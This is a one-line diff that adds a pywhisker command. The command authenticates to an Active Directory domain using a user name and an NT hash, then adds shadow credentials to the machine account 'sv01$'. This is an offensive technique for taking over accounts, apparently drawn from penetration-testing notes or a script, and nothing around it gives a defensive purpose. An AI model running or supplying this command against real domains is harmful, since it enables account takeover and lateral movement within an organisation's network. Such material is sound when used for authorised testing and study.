@@ -1,0 +1,1 @@
+pywhisker -v -d "$DOMAIN" -u "$USER" -H "$NT_HASH" -t 'sv01$' -a 'add'
